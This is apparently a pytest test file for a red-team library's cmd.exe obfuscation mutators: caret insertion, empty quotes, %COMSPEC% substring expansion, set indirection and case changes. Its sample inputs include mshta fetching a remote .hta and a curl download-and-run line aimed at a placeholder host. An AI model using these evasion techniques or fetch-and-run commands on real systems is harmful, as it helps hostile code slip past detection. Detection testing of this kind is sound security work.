# Seeded RNGs drive the mutators; not crypto.
"""cmd mutators: each output is checked against a hand-written reference of
what cmd.exe does to it (caret removal, quote removal in the program name,
``%COMSPEC%`` substring expansion)."""

import random
import re

import pytest

from redteam.models import Shell
from redteam.mutate import _kw, get
from redteam.mutate.cmd import COMSPEC_OFFSETS, unescape_carets

COMSPEC = 'C:\\WINDOWS\\system32\\cmd.exe'
EXE = 'ms' + 'hta'
SAMPLES = [
    f'{EXE} https://example.invalid/a.hta',
    'notepad C:\\x\\a.txt',
    f'"C:\\Windows\\System32\\{EXE}.exe" https://example.invalid/a',
    'curl -s -o a.exe https://example.invalid/a & start a.exe',
]


def m(technique):
    return get(technique, Shell.CMD)


def expand_comspec(text):
    def sub(mt):
        off, length = int(mt.group(1)), int(mt.group(2))
        start = len(COMSPEC) + off
        return COMSPEC[start : start + length]

    return re.sub(r'%COMSPEC:~(-?\d+),(\d+)%', sub, text)


def first_word(text):
    return text.split(' ', 1)[0]


@pytest.mark.parametrize('payload', SAMPLES)
def test_caret_is_removed_by_cmd(payload):
    for k in range(20):
        out = m('cmd.caret')(payload, random.Random(k))
        if out is None:
            continue
        assert '^' in out
        assert unescape_carets(out) == payload


def test_caret_hand_examples():
    assert unescape_carets('n^o^t^e x') == 'note x'
    # Inside quotes a caret is literal.
    assert unescape_carets('"a^b" c^d') == '"a^b" cd'
    # Never before a pipe side or inside quotes / %var%.
    assert m('cmd.caret')('curl x | sort', random.Random(1)) is None
    out = m('cmd.caret')('"ab cd" %ef% gh', random.Random(3))
    assert out is None or out.startswith('"ab cd" %ef% g')


def test_empty_quotes():
    out = m('cmd.empty_quotes')(SAMPLES[0], random.Random(0))
    assert out.count('""') == 1
    assert out.replace('""', '') == SAMPLES[0]
    assert '""' in first_word(out)
    # Builtins do not survive quotes; quoted program paths are left alone.
    assert m('cmd.empty_quotes')('set x=1', random.Random(0)) is None
    assert m('cmd.empty_quotes')(SAMPLES[2], random.Random(0)) is None


def test_comspec_offsets_point_at_the_letter():
    for ch, off in COMSPEC_OFFSETS.items():
        assert COMSPEC[off].lower() == ch
    assert expand_comspec('%COMSPEC:~-7,1%') == 'c'


def test_substring_expands_back():
    for k in range(10):
        out = m('cmd.substring')(SAMPLES[0], random.Random(k))
        assert '%COMSPEC:~-' in out
        assert expand_comspec(out).lower() == SAMPLES[0].lower()


def test_set_indirection_form():
    out = m('cmd.set_indirection')(SAMPLES[0], random.Random(0))
    mt = re.fullmatch(r'set "(_[a-z]{3})=(\S+)" & call %\1%( .*)', out)
    assert mt, out
    assert mt.group(2) + mt.group(3) == SAMPLES[0]
    # call re-parses the rest: not with %, ^, pipes or redirections.
    for bad in ('a %x%', 'a ^b', 'a | b', 'a > f', 'set x=1'):
        assert m('cmd.set_indirection')(bad, random.Random(0)) is None


def test_wrap():
    out = m('cmd.wrap')(SAMPLES[3], random.Random(0))
    mt = re.fullmatch(r'(?i)cmd(?:\.exe)? (/d )?/s /c "(.*)"', out)
    assert mt and mt.group(2) == SAMPLES[3]
    assert _kw.CMD in out.lower()
    # Quoted operators would be unquoted by the outer parse; % expands twice.
    assert m('cmd.wrap')('echo "a & b"', random.Random(0)) is None
    assert m('cmd.wrap')('echo %PATH%', random.Random(0)) is None


def test_case():
    out = m('cmd.case')(SAMPLES[0], random.Random(0))
    assert out != SAMPLES[0]
    assert out.lower() == SAMPLES[0].lower()
    assert out.split(' ', 1)[1] == SAMPLES[0].split(' ', 1)[1]
